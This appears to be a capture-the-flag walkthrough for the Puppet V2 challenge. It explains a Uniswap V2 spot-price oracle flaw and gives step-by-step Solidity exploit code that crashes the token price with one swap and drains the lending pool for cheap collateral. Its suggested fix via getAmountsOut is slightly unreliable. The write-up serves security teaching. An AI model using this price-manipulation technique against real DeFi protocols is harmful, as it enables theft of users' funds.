## Challenge 9 Walkthrough: Puppet V2

### Vulnerability

The same root cause as Puppet V1 — a spot price oracle — but now using Uniswap V2 via the official library. The vulnerable function is `_getOracleQuote()`:

```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({
            factory: _uniswapFactory,
            tokenA: address(_weth),
            tokenB: address(_token)
        });

    return UniswapV2Library.quote({
        amountA: amount * 10 ** 18,
        reserveA: reservesToken,
        reserveB: reservesWETH
    });
    // quote() = amountA * reserveB / reserveA
    // = (amount * 1e18) * reservesWETH / reservesToken
    // ← pure reserve ratio, moves instantly with any swap
}
```

`UniswapV2Library.quote()` is a simple proportion: `amountA * reserveB / reserveA`. It reads the **current** reserves via `getReserves()` and returns their instantaneous ratio. No TWAP, no time-weighting, no staleness check. The collateral requirement uses this directly:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}
```

Initial reserves: 100 DVT / 10 WETH → price = 0.1 WETH per DVT → borrowing 1,000,000 DVT requires 300,000 WETH collateral. The pool holds 1,000,000 DVT, the player holds 10,000 DVT and 20 ETH — enough to crash the price dramatically.

The README notes "Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?" — the answer is no. Using the official Uniswap V2 library doesn't change the fact that `quote()` is a spot price function, not a TWAP.

### Exploit

No helper contract needed — all steps run inline in `test_puppetV2()`. There is no nonce constraint in this challenge.

**Step 1 — Dump 10,000 DVT → ETH via Uniswap V2 router:**

```solidity
address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);

token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
uniswapV2Router.swapExactTokensForETH(
    PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp * 2
);
```

Reserve state before and after:

| | WETH reserve | DVT reserve | `_getOracleQuote(1 DVT)` |
|-|--------------|-------------|--------------------------|
| Before | 10 WETH | 100 DVT | 0.1 WETH |
| After dump | ~0.099 WETH | ~10,100 DVT | ~0.0000098 WETH |

Price crashes ~10,000x. The player receives ~9.9 ETH from the swap.

**Step 2 — Wrap all ETH to WETH:**

```solidity
weth.deposit{value: player.balance}();
```

`PuppetV2Pool.borrow()` requires WETH collateral via `transferFrom` — native ETH is not accepted. Player now holds ~29.9 WETH (20 initial + ~9.9 from swap).

**Step 3 — Calculate required collateral and approve:**

```solidity
uint256 wethNeeded = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
weth.approve(address(lendingPool), wethNeeded);
```

After the dump, `calculateDepositOfWETHRequired(1_000_000 DVT)`:
```
= _getOracleQuote(1_000_000e18) * 3 / 1e18
= (1_000_000e18 * 1e18 * ~0.099e18 / ~10_100e18) * 3 / 1e18
≈ 29.4 WETH
```

Well within the player's ~29.9 WETH balance.

**Step 4 — Borrow all 1,000,000 DVT:**

```solidity
lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
```

Pool pulls ~29.4 WETH as collateral and transfers 1,000,000 DVT to the player.

**Step 5 — Transfer to recovery:**

```solidity
token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
```

### Why It Works

The upgrade from Uniswap V1 to V2 changed the AMM design — constant product formula, ERC20/ERC20 pairs, router abstraction — but left the oracle design flaw untouched. Both `PuppetPool._computeOraclePrice()` and `PuppetV2Pool._getOracleQuote()` read the current reserve ratio and use it immediately as the price. Both are manipulable with a single swap in the same transaction.

`UniswapV2Library.quote()` is documented as a utility function for proportional calculations — it is not designed or intended for use as a price oracle. The fix is `UniswapV2Library.getAmountsOut()` with a TWAP accumulator, or using a dedicated oracle like Chainlink. Puppet V3 demonstrates the TWAP approach — and shows it still isn't sufficient if the observation window is too short.

This is a **Uniswap V2 spot price oracle manipulation** attack — same root cause as V1, same single-transaction exploit, same fix required.

**Related challenges:** SCH's `dex-2 (Sniper)` lab works directly with `getReserves` and `getAmountOut` on Uniswap V2 — the same low-level primitives that Puppet V2's oracle reads via `UniswapV2Library.quote()`. The lab teaches the reserve-math intuition (constant product, price impact of a swap, fee adjustment) before applying it to the oracle-manipulation framing.
